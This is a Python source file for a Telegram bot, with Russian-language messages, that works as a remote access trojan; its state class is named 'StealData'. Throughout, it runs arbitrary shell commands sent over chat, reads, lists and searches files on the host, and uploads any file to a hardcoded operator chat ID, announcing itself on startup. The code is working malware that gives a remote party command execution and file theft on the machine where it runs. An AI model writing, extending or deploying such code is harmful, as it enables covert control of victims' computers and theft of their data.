import aiogram
from aiogram import Dispatcher, Bot
from BotForStill.config import TOKEN
from aiogram.filters import Command, CommandStart
import asyncio
from aiogram.types import Message
from pyexpat.errors import messages
from aiogram.exceptions import TelegramBadRequest
from BotForStill.utils import search_one_word, read_file_fu, show_files, find
from aiogram import F
from aiogram.types import FSInputFile
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
import subprocess


bot = Bot(TOKEN)
dp = Dispatcher()
CHAT_ID = "964584467"

class StealData(StatesGroup):
    waiting_for_action = State()
    waiting_for_word = State()
    find_one = State()
    reading_file = State()
    send_file = State()
    show_files = State()
    reverse_shell = State()

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    print(message.chat.id)
    await state.set_state(StealData.waiting_for_action)
    await message.answer("Введите команду")
    await message.answer("Доступные команды: /shell, /find, /read, /send, /show, /help")


@dp.message(StealData.waiting_for_action)
async def action(message: Message, state: FSMContext):
    
    user_command = message.text.lower()
    
    valid_comands = ['/find', '/read', '/send', '/show', '/shell', '/help']
    
    if user_command in valid_comands:
        await message.answer(f"Выполняю команду: {user_command}")
        if user_command == "/read":
            await message.answer("Напишите путь до файла: ")
            await state.set_state(StealData.reading_file)  
        if user_command == "/find":
            await message.answer("Напиши директорию от которой хочешь начать искать: ")
            await state.set_state(StealData.find_one)
        if user_command == "/send":
            await message.answer("Напишите путь до файла: ")
            await state.set_state(StealData.send_file)
        if user_command == "/show":
            await message.answer("Напишите путь до директории: ")
            await state.set_state(StealData.show_files)    
        if user_command == "/shell":
            await message.answer("Напишите команду: ")
            await state.set_state(StealData.reverse_shell)
        if user_command == "/help":
            await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
            await state.set_state(StealData.waiting_for_action)
    if user_command not in ['/find' ,'/read', '/send', '/show', '/shell', '/help']:
        await message.answer("❌ Неправильная команда!")
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
        return


@dp.message(StealData.reading_file)
async def read_file(message: Message, state: FSMContext):
    path_from_user = message.text
    if path_from_user.lower() == "exit":
        await message.answer("Выход из режима read")
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    result = read_file_fu(path_from_user)
    if result is None:
        await message.answer("Ошибка чтения файла")
        return
    
    if len(result) > 3500:
        await message.answer(f"Вывод слишком длинный ({len(result)} символов)")
        await message.answer("Первые 3000 символов:")
        await message.answer(f"```\n{result[:3000]}\n```", parse_mode="Markdown")
    else:
        await message.answer(f"```\n{result}\n```", parse_mode="Markdown")
        

    

@dp.message(StealData.find_one)
async def com_search(message: Message, state: FSMContext):
    directory = message.text.strip() 
    
    if directory.lower() == "exit":
        await message.answer("Выход из режима find")
        await state.set_state(StealData.waiting_for_action)
        return
    
    await state.update_data(directory=directory)
    await message.answer("Теперь введите что хотите найти:")
    await state.set_state(StealData.waiting_for_word)

@dp.message(StealData.waiting_for_word)
async def search_word(message: Message, state: FSMContext):
    search_word = message.text.strip().split()
    
    if search_word[0].lower() == "exit":
        await message.answer("Выход из режима find") 
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")

        await state.set_state(StealData.waiting_for_action)
        return
    
    data = await state.get_data()
    directory = data.get("directory")
    
    result = find(directory, search_word)
    result_str = "\n".join(result)
    if len(result_str) > 3500:
        await message.answer(f"Вывод слишком длинный ({len(result_str)} символов)")
        await message.answer("Первые 3000 символов:")
        await message.answer(f"```\n{result_str[:3000]}\n```", parse_mode="Markdown")
    else:
        await message.answer(f"```\n{result_str}\n```", parse_mode="Markdown")
    
    await state.set_state(StealData.waiting_for_action)



@dp.message(StealData.show_files)
async def ls(message: Message, state: FSMContext):
    path_from_user = message.text
    if path_from_user.lower() == "exit":
        await message.answer("Выход из режима find_one")
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    result = show_files(path_from_user)
    result_str = "\n".join(result)
    try:
        await message.answer(result_str)
    except TelegramBadRequest as e:
        if "message is too long" in str(e):
            await message.answer(f"Найдено {len(result)} файлов, но список слишком длинный для отправки")
            await message.answer("Первые 5 файлов:")
            short_list = "\n".join(result[:5])
            await message.answer(short_list)

@dp.message(StealData.reverse_shell)
async def shell(message: Message, state: FSMContext):
    command = message.text
    if command.lower() == "exit":
        await message.answer("Выход из режима shell")
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    try:
        result = subprocess.run(command, shell=True, capture_output=True, timeout=30, encoding="cp866",  errors="replace")
        
        output = result.stdout or result.stderr
        
        if not output:
            output = "Команда выполнена без вывода"
        
        if len(output) > 3500:
            await message.answer(f"Вывод слишком длинный ({len(output)} символов)")
            await message.answer("Первые 3000 символов:")
            await message.answer(f"```\n{output[:3000]}\n```", parse_mode="Markdown")
        else:
            await message.answer(f"```\n{output}\n```", parse_mode="Markdown")

    except subprocess.TimeoutExpired:
        await message.answer("Команда превысила время ожидания (30 сек)")
    except Exception as e:
        await message.answer(f"Ошибка выполнения: {e}")


@dp.message(StealData.send_file)
async def send_file(message: Message, state: FSMContext):
    

    file_path = message.text
    if file_path.lower() == "exit":
        await message.answer("Выход из режима shell")
        await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    try:
        document = FSInputFile(file_path)
        await bot.send_document(chat_id=CHAT_ID, document=document, 
                            caption=f"Файл: {file_path}")
    except FileNotFoundError:
        await message.answer("Файл не найден")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
    

async def main():
    await bot.send_message(chat_id=CHAT_ID, text = "Bot was started")
    await bot.send_message(chat_id=CHAT_ID, text = "Напиши команду /start , чтобы начать пользоваться ботом")
    await dp.start_polling(bot)
    

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"Произошла ошибка {e}")


#Написать фунции
    #1)Прочтение содержимого файла
    #2)Выгрузка файла

#Сделать FSM для обработки сценариев:
    #ls, pwd, cd
    #Если файл слишком больщой выгружать 

#Сделать выгрузку файлов
    
    #2)Сделать через FSM сценарии и обработки событий
    